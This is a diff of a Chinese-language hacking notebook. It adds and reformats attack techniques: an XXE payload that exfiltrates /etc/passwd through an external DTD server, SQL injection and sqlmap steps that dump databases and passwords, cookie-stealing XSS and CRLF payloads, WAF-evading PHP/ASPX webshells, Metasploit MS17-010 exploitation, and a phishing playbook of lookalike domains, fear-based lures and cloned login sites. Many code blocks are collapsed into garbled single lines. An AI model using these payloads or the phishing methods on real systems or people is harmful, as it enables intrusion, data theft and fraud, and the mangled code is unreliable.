 ### XXE 攻击
+#### 奇淫技巧
+如果网站允许上传 .docx  .xlsx  、 .pptx  文件，其实本质只是个 XML 文件的压缩包。
+创建了一个 .docx (或其他x) 文件，并使用 7zip 打开它来提取内容，并将下面的载荷插入了一个 XML 文件中
+```bash
+<!DOCTYPE root [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://197.37.102.90/ext.dtd">
+%dtd;
+%send;
+]]>
+```
 
 #### 自动攻击工具
 
@@ -3125,10 +3132,7 @@ oob
 这些文件是攻击者注入远程托管的恶意脚本以获得管理员访问权限或关键信息的文件。我们将尝试获取/etc/passwd为此我们将输入以下命令。
 
 ```bash
-<?xml version="1.0" encoding="utf-8"?> 
-<!DOCTYPE reset [ 
-<!ENTITY ignite SYSTEM "file:///etc/passwd"> 
-]><reset><login>&ignite;</ login><secret>有任何错误吗？</secret></reset>
+<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE reset [ <!ENTITY ignite SYSTEM "file:///etc/passwd"> ]><reset><login>&ignite;</ login><secret>有任何错误吗？</secret></reset>
 ```
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604120133412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -3206,76 +3210,27 @@ SELECT * FROM users WHERE id='$id' LIMIT 0,1
 **步骤1.查看有无注入点**
 
 ```bash
-# 输入：
-3''		# 或尝试3’ and 1=1--+ 与 3’ and 1=2--+
-
-# 在代码中发生了：
-SELECT * FROM users WHERE id='3'' LIMIT 0,1
-
-# 执行结果：
-You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''3'' LIMIT 0,1' at line 1
+# 输入：3''		# 或尝试3’ and 1=1--+ 与 3’ and 1=2--+# 在代码中发生了：SELECT * FROM users WHERE id='3'' LIMIT 0,1# 执行结果：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''3'' LIMIT 0,1' at line 1
 ```
 
 **步骤2.查看有几列**
 要输入至少两次来找到临界点
 
 ```bash
-# 输入第一次：
-3' order by 4 --+
-
-# 在代码中发生了：
-SELECT * FROM users WHERE id='3' order by 4 -- ' LIMIT 0,1
-
-# 执行结果：
-Unknown column '4' in 'order clause'
-
-# 输入第一次：
-3' order by 3 --+
-
-# 在代码中发生了：
-SELECT * FROM users WHERE id='3' order by 3 -- ' LIMIT 0,1
-
-# 执行结果：
-查询结果
+# 输入第一次：3' order by 4 --+# 在代码中发生了：SELECT * FROM users WHERE id='3' order by 4 -- ' LIMIT 0,1# 执行结果：Unknown column '4' in 'order clause'# 输入第一次：3' order by 3 --+# 在代码中发生了：SELECT * FROM users WHERE id='3' order by 3 -- ' LIMIT 0,1# 执行结果：查询结果
 ```
 
 **步骤3.信息搜集**
 常见搜集database()、version()、user()
 
 ```bash
-# 输入：
--3' union select 1,database(),version() --+
-
-# 在代码中发生了：
-SELECT * FROM users WHERE id='-3' union select 1,database(),version() -- ' LIMIT 0,1
-
-# 执行结果：
-1，database()、版本名version()
+# 输入：-3' union select 1,database(),version() --+# 在代码中发生了：SELECT * FROM users WHERE id='-3' union select 1,database(),version() -- ' LIMIT 0,1# 执行结果：1，database()、版本名version()
 ```
 
 **步骤4.获得数据库内容**
 
 ```bash
-# 输入以下语句，为爆表名：
--3'union SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
-# 在代码中发生了：
-SELECT * FROM users WHERE id='-3'union SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- ' LIMIT 0,1
-# 执行结果：
-1，2，表名
-
-# 输入以下语句，为爆列名：
--3'union SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='关注的表名' --+
-# 在代码中发生了：
-SELECT * FROM users WHERE id='-3'union SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- ' LIMIT 0,1
-# 执行结果：
-1，2，列名
-
-# 输入以下语句，为获得字段名：
--3'union SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='关注的表名' --+
-# 在代码中发生了：
-SELECT * FROM users WHERE id='-3'union SELECT 1,2,group_concat(password) from users-- ' LIMIT 0,1
-# 执行结果：
-1，2，字段名
+# 输入以下语句，为爆表名：-3'union SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+# 在代码中发生了：SELECT * FROM users WHERE id='-3'union SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- ' LIMIT 0,1# 执行结果：1，2，表名# 输入以下语句，为爆列名：-3'union SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='关注的表名' --+# 在代码中发生了：SELECT * FROM users WHERE id='-3'union SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- ' LIMIT 0,1# 执行结果：1，2，列名# 输入以下语句，为获得字段名：-3'union SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='关注的表名' --+# 在代码中发生了：SELECT * FROM users WHERE id='-3'union SELECT 1,2,group_concat(password) from users-- ' LIMIT 0,1# 执行结果：1，2，字段名
 ```
 
 ##### 变种分析
@@ -3289,9 +3244,7 @@ SELECT * FROM users WHERE id='$id' LIMIT 0,1
 闭合符号不一样
 
 ```bash
-SELECT * FROM users WHERE id LIMIT 0,1
-SELECT * FROM users WHERE id="$id" LIMIT 0,1
-SELECT * FROM users WHERE id=('$id') LIMIT 0,1
+SELECT * FROM users WHERE id LIMIT 0,1SELECT * FROM users WHERE id="$id" LIMIT 0,1SELECT * FROM users WHERE id=('$id') LIMIT 0,1
 ```
 
 结论：黑盒注入你首先要先对前面的单引号或双引号进行闭合。具体是单引号还是双引号，要手工尝试分析
@@ -3301,11 +3254,7 @@ SELECT * FROM users WHERE id=('$id') LIMIT 0,1
 大概写了个形式代码，其执行逻辑类似于如下。这逻辑结果导致网站的数据库结果不会直接显示在页面上，对于有查询结果的
 
 ```bash
-$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
-if(有查询结果)
-{
- 	echo 'You are in...........';
-}
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";if(有查询结果){ 	echo 'You are in...........';}
 ```
 
 
@@ -3359,9 +3308,7 @@ https://exampleurl.com/login.php?id=1'
 使用布尔漏洞利用，我们可以制作要在服务器上执行的查询，最终看起来像这样：
 
 ```bash
-SELECT  *
-FROM    Users
-WHERE   UserID = '1' AND ASCII(SUBSTRING(username,1,1)) = 97 AND '1' = '1'
+SELECT  *FROM    UsersWHERE   UserID = '1' AND ASCII(SUBSTRING(username,1,1)) = 97 AND '1' = '1'
 ```
 
 让我们分解一下。内部函数总是先执行，所以 SUBSTRING() 取用户名字符串的第一个字符并将长度限制为 1；这样，我们可以一次遍历每个字符，直到到达字符串的末尾。
@@ -3373,9 +3320,7 @@ WHERE   UserID = '1' AND ASCII(SUBSTRING(username,1,1)) = 97 AND '1' = '1'
 测试基于布尔的注入时需要做的最后一件事是确定何时停止，即知道字符串的长度。一旦我们达到空值（ASCII 代码 0），那么我们要么完成并发现整个字符串，要么字符串本身包含一个空值。我们可以通过使用 LENGTH() 函数来解决这个问题。假设我们试图获取的用户名是“jsmith”，那么查询可能如下所示：
 
 ```bash
-SELECT  *
-FROM    Users
-WHERE   UserID = '1' AND LENGTH(username) = 6 AND '1' = '1'
+SELECT  *FROM    UsersWHERE   UserID = '1' AND LENGTH(username) = 6 AND '1' = '1'
 ```
 
 如果返回 true，则我们已成功识别用户名。如果返回 false，则字符串包含空值，我们需要继续该过程，直到发现另一个空字符。
@@ -3390,16 +3335,13 @@ MySQL 还有一个名为 BENCHMARK() 的函数，可用于基于时间的注入�
 基于时间的 SQL 注入涉及向数据库发送请求并分析服务器响应时间以推断信息。我们可以通过利用数据库系统中使用的睡眠和时间延迟功能来做到这一点。像以前一样，我们可以使用 ASCII() 和 SUBSTRING() 函数来帮助枚举字段以及名为 SLEEP() 的新函数。让我们检查以下发送到服务器的 MySQL 查询：
 
 ```bash
-SELECT  *
-FROM    Users
-WHERE   UserID = 1 AND IF(ASCII(SUBSTRING(username,1,1)) = 97, SLEEP(10), 'false')
+SELECT  *FROM    UsersWHERE   UserID = 1 AND IF(ASCII(SUBSTRING(username,1,1)) = 97, SLEEP(10), 'false')
 ```
 
 基本上，这表明如果用户名的第一个字符是“a”(97)，则运行 CURTIME() 一千万次。CURTIME() 返回当前时间，但这里传递的函数并不重要；但是，重要的是要确保该函数运行足够多的时间以产生重大影响。
 
 ```bash
 WHERE   UserID = 1 AND IF(ASCII(SUBSTRING(username,1,1)) = 97, BENCHMARK(10000000, CURTIME()), 'false')
-
 ```
 
 ###### 其他数据库的时间注入
@@ -3408,7 +3350,6 @@ PostgreSQL 使用 pg_sleep() 函数：
 
 ```bash
 WHERE   UserID = 1 AND IF(ASCII(SUBSTRING(username,1,1)) = 97, pg_sleep(10), 'false')
-
 ```
 
 
@@ -3419,34 +3360,13 @@ WHERE   UserID = 1 AND IF(ASCII(SUBSTRING(username,1,1)) = 97, pg_sleep(10), 'fa
 使用sqlmap 步骤是：
 
 ```python
-# 1.判断链接是否可注入
-# 手工:当你想要寻找界面是否含有注入点，你应该警惕源码中含有?的URL链接测试比如？id=1和？id=1'看界面返回区别，或者是附上？id=1 and 1=1 和？id=1 and 1=2；或者是+1 和-1 注意这里+在url编码中有特殊含义，记得将+编码为%2b
-sqlmap -u URL --level 5 --batch --random-agent#  当url参数大于1时需要将url用“”引起来。
-
-
-# 2. 如果可注入，查询当前用户下所有数据库。不可注入的话，就没有后续步骤了。
-# 手工: order by 3
-# 手工: id=-1 union select 1, database(), 3 # UNION的作用是将两个select查询结果合并
-sqlmap -u URL --dbs # --dbs也可以缩写为-D
-
-# 3. 如果可查询到数据库，则进行查询数据库中表名
-sqlmap -u URL -D 数据库名  --tables # --tables可以缩写为-T
-
-# 4.规则同上
-sqlmap -u URL -D 数据库名  -T 表名 --columns 
-
-
-# 5.规则同上，字段内容
-sqlmap -u URL -D 数据库名  -T 表名  -C 列名 --dump
+# 1.判断链接是否可注入# 手工:当你想要寻找界面是否含有注入点，你应该警惕源码中含有?的URL链接测试比如？id=1和？id=1'看界面返回区别，或者是附上？id=1 and 1=1 和？id=1 and 1=2；或者是+1 和-1 注意这里+在url编码中有特殊含义，记得将+编码为%2bsqlmap -u URL --level 5 --batch --random-agent#  当url参数大于1时需要将url用“”引起来。# 2. 如果可注入，查询当前用户下所有数据库。不可注入的话，就没有后续步骤了。# 手工: order by 3# 手工: id=-1 union select 1, database(), 3 # UNION的作用是将两个select查询结果合并sqlmap -u URL --dbs # --dbs也可以缩写为-D# 3. 如果可查询到数据库，则进行查询数据库中表名sqlmap -u URL -D 数据库名  --tables # --tables可以缩写为-T# 4.规则同上sqlmap -u URL -D 数据库名  -T 表名 --columns # 5.规则同上，字段内容sqlmap -u URL -D 数据库名  -T 表名  -C 列名 --dump
 ```
 
 其他有用命令
 
 ```python
-sqlmap -u URL --users
-sqlmap -u  URL --passwords # 要是密码加密请在网站cmd5中解密
-sqlmap -u URL --current-db
-sqlmap -u URL --current-user
+sqlmap -u URL --userssqlmap -u  URL --passwords # 要是密码加密请在网站cmd5中解密sqlmap -u URL --current-dbsqlmap -u URL --current-user
 ```
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708204428465.png)
@@ -3570,7 +3490,6 @@ union 和select 放一起就会被墙，用以下方法就是安全的
 
 ```bash
 %27%20or%201%3D1--
-
 ```
 
 #### 十六进制编码（HEX）
@@ -3591,7 +3510,6 @@ SELECT * FROM Users WHERE name=61646D696E--
 
 ```bash
 SELECT * FROM Users WHERE name=UNHEX('61646D696E')--
-
 ```
 
 #### 字符编码
@@ -3605,7 +3523,6 @@ SELECT * FROM Users WHERE name='admin'--
 
 ```bash
 SELECT * FROM Users WHERE name=CHAR(97,100,109,105,110)--
-
 ```
 
 #### 字符串连接
@@ -3620,26 +3537,22 @@ mysql
 
 ```bash
 CONCAT('SEL', 'ECT') * FROM Users WHERE id=1
-
 ```
 
 PostgreSQL：
 
 ```bash
 'SEL' || 'ECT' * FROM Users WHERE id=1
-
 ```
 
 甲骨文（两个选项）：
 
 ```bash
 CONCAT('SEL', 'ECT') * FROM Users WHERE id=1
-
 ```
 
 ```bash
 'SEL' || 'ECT' * FROM Users WHERE id=1
-
 ```
 
 #### 注释
@@ -3648,7 +3561,6 @@ CONCAT('SEL', 'ECT') * FROM Users WHERE id=1
 
 ```bash
 SELECT/**/*/**/FROM/**/Users/**/WHERE/**/name/**/=/**/'admin'--
-
 ```
 
 #### 组合
@@ -3657,14 +3569,12 @@ SELECT/**/*/**/FROM/**/Users/**/WHERE/**/name/**/=/**/'admin'--
 
 ```bash
 SELECT/**/*/**/FROM/**/Users/**/WHERE/**/name/**/=/**/'admin'--
-
 ```
 
 使用 URL 编码屏蔽注释字符的相同查询：
 
 ```bash
 SELECT%2F%2A%2A%2F%2A%2F%2A%2A%2FFROM%2F%2A%2A%2FUsers%2F%2A%2A%2FWHERE%2F%2A%2A%2Fname%2F%2A%2A%2F%3D%2F%2A%2A%2F%E2%80%99admin%E2%80%99--
-
 ```
 
 
@@ -3754,16 +3664,20 @@ cookie注入 后接cookie值
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705235758892.png)
 
 ## xss攻击
+**攻击严重性**
+xss攻击对提交表单或发出的链接请求中所有变量嵌入执行javascript脚本，所以xss的执行结果可以通过过滤拦截可以通过源码读取,javascript脚本能执行多强就意味着xss能达到什么样的攻击。
 
-xss攻击对提交表单或发出的链接请求中所有变量嵌入执行javascript脚本，所以xss的执行结果可以通过过滤拦截可以通过源码读取,javascript脚本能执行多强就意味着xss能达到什么样的攻击。只要有数据交互的，数据展示的地方就有可能存在xss攻击比如对你的用户名展示，对你输入的东西展示。比如留言，网站callback等
+**常出现在**
+只要有允许用户输入数据的，且后端没有接受过滤的就存在xss攻击比如对你的用户名展示，对你输入的东西展示。常见出现在：
 
-
+ - 表单框：搜索框、文本编辑框、留言框
+ - html参数
+ - 网站callback
+ - 文件名、用户名
 
 
 **技巧：从phpinfo返回信息获得管理权限**
 phpinfo展示界面中拥有cookie值，你获取到这个之后可以访问网站，进行xss操作，如获取源码等
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710150205547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
 
 ### 典型用法
 
@@ -3861,16 +3775,14 @@ beef还是很强大的，入侵成功后可以对对方页面进行跳转或者�
 ### 防御与绕过
 
 首先需要寻找可注入的参数，以免你的输入被直接过滤掉了。比如通过查看网页的返回你将能找到某个可注入的参数，xss可能出现在任何地方比如你的ip被回显到界面，比如page参数通常也会回显到界面
-开启httponly，输入过滤，输出过滤等
 
-
-#### httponly
-
+#### 防御
 特殊字符过滤
-http-only（防御xss的cookie盗取）
+特殊字符转义
+http-only（防御xss的cookie盗取，你可以破解此防御的方案之一是采用CRLF做分割）
 
 
-#### 绕过方案
+#### 绕过过滤
 
 **٩( 'ω' )و 手动**
 
@@ -3882,10 +3794,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(2222222222222222) )
 不常见函数
 
 ```bash
-<b onmouseover=alert('XSS')>Click Me!</b>
-<svg onload=alert(1)>
-<body onload="alert('XSS')">
-<img src="http://test.cyberspacekittens.com" onerror=alert(document.cookie);>
+<b onmouseover=alert('XSS')>Click Me!</b><svg onload=alert(1)><body onload="alert('XSS')"><img src="http://test.cyberspacekittens.com" onerror=alert(document.cookie);>
 ```
 
 **工具**
@@ -3898,7 +3807,7 @@ http://www.jsfuck.com/
 
 ## CSRF
 
-只要受害者在登录状态，点击了一下你的链接，就可以完成攻击。一般你在选取csrf界面时你应该选择可以添加（管理员、用户等）、删除、修改等操作上。如果不能做这些即便有相关漏洞也是没什么危害的。
+只要受害者在登录状态，点击了一下你的恶意链接，或者你在网页中内嵌了渲染代码(恶意网站的链接可以包含有效的HTML， <imgsrc=”www.malicious_site.com”>  ，并且并不需要 受害者点击链接)也可以完成攻击。一般你在选取csrf界面时你应该选择可以添加（管理员、用户等）、删除、修改等操作上。如果不能做这些即便有相关漏洞也是没什么危害的。
 **危害性**
 比xss更大，更难防范。通常可以用来以目标用户的名义发邮件、盗取目标用户账号、购买商品。通常用来做蠕虫攻击、刷SEO流量等。
 
@@ -3925,7 +3834,7 @@ http://www.jsfuck.com/
 由于防御方法简单且难以被绕过，因此现在这种漏洞在大型网站几乎没有，小型网站你要想用此攻击获取普通用户的还是比较好搞，但是要想获取管理员的，你必须知道管理员请求数据包的方式。
 
 >1.当用户发送重要的请求时需要输入原始密码
->2.设置随机Token
+>2.对网页生成随机Token，一边给用户，一边存在服务器。当它提交数据时必须带着token一起发送，而在服务器的另一端会验证用户
 >3.检验referer来源，请求时判断请求连接是否为当前管理员正在使用的页面(管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败)
 >4.设置验证码
 >5.限制请求方式只能为POS
@@ -4020,6 +3929,39 @@ autoSubTakeover
 ### HTTP劫持
 
 ### DLL劫持
+## 攻击漏洞技巧
+### CRLF 注入
+
+**简介**
+难度：低
+
+通常用在：分享链接
+拓展思路：对客户端的攻击，比如投票、跳转、关注等；
+绕过安全防护软件；
+
+
+**实战**
+
+测试链接：
+
+会话固定、XSS、缓存病毒攻击、日志伪造
+
+### 宽字节注入
+
+只要发现使用gbk，韩文、日文等编码时就可以考虑可能存在宽字节注入漏洞。
+
+在%df遇到%5c时，由于%df的ascii大于128，所以会自动拼接%5c，吃掉反斜线。而%27 %20小于ascii(128)的字符就会保留。通常都会用反斜线来转义恶意字符串，但是如果被吃掉后，转义失败，恶意的xss代码可以继续运行。
+反斜杠的GBxxx编码为%5C，根据GBxxx编码在前面加上%DE，%DF，%E0。。。都可以组成一个汉字，从而把反斜杠这个转义字符给吃了
+%27---------单引号
+
+%20----------空格
+
+%23-----------#号
+
+%5c------------/反斜杠
+
+php中有一个转义字符
+
 
 # 绕过检测
 
@@ -4150,8 +4092,7 @@ BT：扫描字典不能有敏感文件如bak等，这就要用文件上传绕过
 如需sqlmap注入，修改us头，加入代理池防止CC拦截，自写Tamper脚本
 
 ```bash
-# waf.py 是自己写的
-sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
+# waf.py 是自己写的sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
 ```
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210716230027420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -4239,13 +4180,7 @@ sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
 可以绕过安全狗、宝塔，但是还是现在WAF都有变量追踪了，如果不追踪输入参数，就可以绕过
 
 ```bash
-# 访问是 x=b & y=assert
-<?php
-	$a = $_GET['x']		# $a=b
-	$$a = $_GET['y']	# $b=assert
-	# base64解码是为了提交post请求时一些如phpinfo的敏感词直接被栏
-	$b(base64_decode($_POST['z']))		# assert($_POST['z'])
-?>
+# 访问是 x=b & y=assert<?php	$a = $_GET['x']		# $a=b	$$a = $_GET['y']	# $b=assert	# base64解码是为了提交post请求时一些如phpinfo的敏感词直接被栏	$b(base64_decode($_POST['z']))		# assert($_POST['z'])?>
 ```
 
 **加密**
@@ -4268,6 +4203,61 @@ sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
 
 
 # 经验积累
+
+## 漏洞出现在？
+挖漏洞关键：跳出思维框架
+### URL参数
+
+#### 经验
+
+每个url参数都意味着可测试
+如果可以追溯参数传递到哪里
+
+#### 出现在：参数可渲染
+
+```bash
+url?error=你想打印在屏幕话# 知道参数会传递将参数补充危险命令## 假设知道参数会以下方式传递<? $val=htmlspecialchars($_GET['par'],ENT_QUOTES); ?> <a href="/page.php?action=view&par='.<?=$val?>.'">View Me!</a>## 添加危险参数http://host/page.php?par=123%26action=edit
+```
+
+#### +http参数污染
+
+```bash
+# 附加参数toAccount=9876&amount=1000&fromAccount=12345&toAccount=99999
+```
+
+#### +CRLF
+
+%0d%0a  是 CRLF。一定要寻找这样的机会，其中站点接受你的输入，并且将其用于返回协议头的一部分（比如某些参数用于创建cookie）。如果存在，进一步尝试使用 XSS 注入来组合盖漏洞
+
+```bash
+%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20te\xt/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<script>alert(dshdjs)</script>
+```
+#### +xss
+检查参数是否接受JS代码
+#### +开放重定向
+检查参数是否接受外部链接
+常见关键词 redirect_to=  ， domain_name=  ， checkout_url= 
+### 嵌入网站元素
+#### +xss
+### 数据包参数
+
+#### 置空
+
+```bash
+# 验证码、cookie等置空# 逻辑漏洞，删除提醒使用完全访问权限的账号登录 Shopify 移动应用拦截 POST /admin/mobile_devices.json  的请求移除该账号的所有权限移除添加的移动端提醒重放 POST /admin/mobile_devices.json  的请求
+```
+
+#### 修改信号
+```bash
+你会注意到有个 <iframe>  标签包含 PIN 参数。这个参数实际上就是你的账户 ID。下面，如果你编辑了 HTML，并且插入了另一个 PIN，站点就会自动在新账户上执行操作
+```
+
+### 重复发包
+
+重放
+竞态
+### 文件上传
+#### +xxe
 
 ## 中间件
 
@@ -4386,10 +4376,7 @@ tp5历史漏洞 https://github.com/Mochazz/ThinkPHP-Vuln
 主要涉及的函数有以下四个：
 
 ```bash
-extract() 
-parse_str() 
-import request variables() 
-$$
+extract() parse_str() import request variables() $$
 ```
 
 如果GET的传参允许被变量，那么通常会配合文件包含或SQL注入拿到隐秘的东西。比如metinfo有类似的漏洞。
@@ -4409,20 +4396,7 @@ import_request_variables()函数就是把GET、POST、COOKIE的参数注册成�
 
 更多请查看《攻击javaweb应用》
 
-#### 与SQL注入有关的预编译
 
-在SQL注入中java要比PHP漏洞少得多，因为其数据库查询通常会写成预编译。
-
-**预编译**
-一般JAVA中常见预编译，不过其他语言也是可以写出来的
-使用PreparedStatement的参数化的查询可以阻止大部分的SQL注入。如下图当java定义接收的参数为？这就代表使用了预编译。注释的就是没有预编译的，通常就可能存在安全漏洞
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718143651696.png)
-
-在使用参数化查询的情况下，数据库系统不会将参数的内容视为SQL指令的一部分来处理，而是在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有破坏性的指令，也不会被数据库所运行。因为对于参数化查询来说，查询SQL语句的格式是已经规定好了的，需要查的数据也设置好了，缺的只是具体的那几个数据而已
-
-case when带入SQL语句可以绕过，但这种只有对方服务器源代码有order by才能奏效。含有order by的网页一般都有排序功能。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714160336287.png)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714160705489.png)
 
 #### JSON WEB TOKEN
 
@@ -4505,8 +4479,7 @@ php一句话木马：
 aspx一句话木马：
 
 ```bash
-<%@ PageLanguage="Jscript"%>
-<%eval(Request.Item["value"])%>
+<%@ PageLanguage="Jscript"%><%eval(Request.Item["value"])%>
 ```
 
 
@@ -4541,9 +4514,7 @@ namp --script=vuln 默认nse插件，扫描有局限，如果要用nmap扫描一
 如果你是第一次使用这个工具，那么工具的可视化界面将对你更友好，更加熟悉msf目录结构。
 
 ```bash
-# 初始化msfdb数据库。如果你不用这个命令直接执行可视化系统仍旧会指导你先进行初始化
-msfdb initb
-armitage
+# 初始化msfdb数据库。如果你不用这个命令直接执行可视化系统仍旧会指导你先进行初始化msfdb initbarmitage
 ```
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210522014217527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -4554,29 +4525,7 @@ msf
 以smb为例
 
 ```bash
-# 1. 启动msf
-service postgresql start
-msfconsole
-
-# 2.搜索相关漏洞
-search smb
-
-# 3. 进入该漏洞列表
-# show payloads可以查看需要设置哪些参数
-use auxiliary/scanner/smb/smb_ms17_010
-
-# 4.设置相关参数
-# show options可以查看需要设置哪些参数
-set RHOSTS 10.101.2.11
-
-#5. 执行利用漏洞
-run
-
-#其他常见命令
-# 查看当前系统
-getuid
-# 获取目标系统的shell
-shell
+# 1. 启动msfservice postgresql startmsfconsole# 2.搜索相关漏洞search smb# 3. 进入该漏洞列表# show payloads可以查看需要设置哪些参数use auxiliary/scanner/smb/smb_ms17_010# 4.设置相关参数# show options可以查看需要设置哪些参数set RHOSTS 10.101.2.11#5. 执行利用漏洞run#其他常见命令# 查看当前系统getuid# 获取目标系统的shellshell
 ```
 
 因为metasploit出现使得成为一名黑客的门槛降低了，这款工具将渗透过程变得简单和自动化。当一个漏洞出来时，在metaspolit会更新，你将可以用此工具做漏洞验证，当数月后漏洞修复了，那么此工具会公开漏洞利用的脚本。
@@ -4605,13 +4554,7 @@ shell
 使用：
 
 ```bash
-git clone https://www.github.com/landgrey/pydictor.git
-cd pydictor/
-python pydictor.py 
-# 查看社工字典
-python pydictor.py –sedb 
-# 合并去重
-python pydictor.py -tool uniqbiner 你的字典文件夹
+git clone https://www.github.com/landgrey/pydictor.gitcd pydictor/python pydictor.py # 查看社工字典python pydictor.py –sedb # 合并去重python pydictor.py -tool uniqbiner 你的字典文件夹
 ```
 
 ### fuzzy
@@ -4661,10 +4604,15 @@ APP-> WEB APP->其他 APP->逆向
 社会工程学通常来说技术含量也不高，但有效。
 
 ## 以假乱真
+
 ### 准备
+
 以下这些步骤是常见的钓鱼准备工作，挑选适用的为钓鱼做准备吧
+
 #### 1. 购买相似域名
+
 ##### 购买谁家强
+
 https://www.freenom.com/zh/index.html?lang=zh
 用匿名邮箱注册吧
 优点:
@@ -4673,20 +4621,29 @@ https://www.freenom.com/zh/index.html?lang=zh
  - 三个月使用时长
 
 缺点：
+
  - 很多域名无法注册
 
 ##### 买什么域名
+
 ###### 常见混淆方法
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/673d8a87adbf4bc7b56b104c8748446f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
 ###### 购买SEO高的域名
+
 搜索过期域
 https://www.expireddomains.net/
 查看如何分类
 http://www.fortiguard.com/webfilter
 https://urlfiltering.paloaltonetworks.com/query/
+
 ###### 其他购买技巧
+
 购买域名越旧被视为垃圾邮件概率就越小
+
 ###### 自动工具
+
 https://github.com/elceef/dnstwist
 [https://github.com/urbanadventurer/urlcrazy](https://github.com/urbanadventurer/urlcrazy)
 https://dnstwist.it/
@@ -4696,10 +4653,15 @@ https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/
 其他策略：
 当登录成功后索引到真实网站
 收藏你的攻击网站
+
 #### 2. 收集邮箱
+
 本文其他部分有介绍，不重复
+
 #### 3. 邮件内容
+
 ##### 主题
+
 网络钓鱼的秘诀在于激发受害者的恐惧感或者紧迫感，有时也会向受害者描绘一些非常美好(甚至不太真实)的诱惑。如果是鱼叉式就自由发挥吧，以下列出了一些思路
 
 ****
@@ -4727,9 +4689,13 @@ hr:简历
 - 恐吓。我已经获得了你的邮箱密码，点击链接打钱！
 
 ****
+
 ##### 结尾
+
 通过如招标文件获得手写签名，将手写签名用于后期钓鱼
+
 ##### 伪造网站
+
 ### 站点伪造
 
 我学这个网站钓鱼是参考这篇博客，如果你觉得我遗漏了一些细节，请参考这篇博客完成实验[网站钓鱼攻击，图文请看这篇博客](https://www.freebuf.com/articles/web/253320.html)
@@ -4745,7 +4711,9 @@ hr:简历
 你想做得更多的话：
 
    登陆阿里云，进入dns控制台添加域名，添加并配置好记录，然后进入云服务器管理控制台，点击实例名进入。Xshell连接服务器（家庭版可），开启http服务。
+
 - 把所有图像和资源移到本地（而不是从被克隆的站点调用）
+
 ### who am i
 
 友套近乎，“他是我一个之前某某某游戏认识的，您能给我一下他的微信吗，好久没跟他聊了”
@@ -4765,6 +4733,7 @@ hr:简历
 你熟悉python选	https://github.com/securestate/king-phisher
 
 #### gophish
+
 官方文档 http://getgophish.com/documentation/
 gophish自带web面板，对于邮件编辑、网站克隆、数据可视化、批量发送等功能的使用带来的巨大的便捷
 在功能上实现分块，令钓鱼初学者能够更好理解钓鱼工作各部分的原理及运用。
@@ -4778,7 +4747,10 @@ gophish自带web面板，对于邮件编辑、网站克隆、数据可视化、�
 DLL劫持
 假冒加固工具
 木马捆绑
-
+#### 链接存放在
+##### +开放重定向
+如果网站有开放重定向只需要将重定向参数修改为外部站点。
+如果用户访问 url?参数=example.com  ，它会重定向到 http://example.com/admin，这时候这种未经验证的参数的跳转网站你就可以伪造一个网站专门用来接待受害者
 #### 宏 – Office
 
 虽然是很老旧，但向受害者发送恶意的 Microsoft Office 文件仍然是久经考验的一种社会工程学攻击方法。那为什么 Office 文件非常适合作为恶意 payload 的载体呢？这是因为 Office 文件的默认设置是支持 VBA 代码所以允许 VBA 代码的代码执行。尽管最近这种方法已经很容易被杀毒软件检测到，但在经过混淆处理之后，在很多情况下仍然可以生效。
@@ -4832,8 +4804,7 @@ usestager windows/macroless_msword
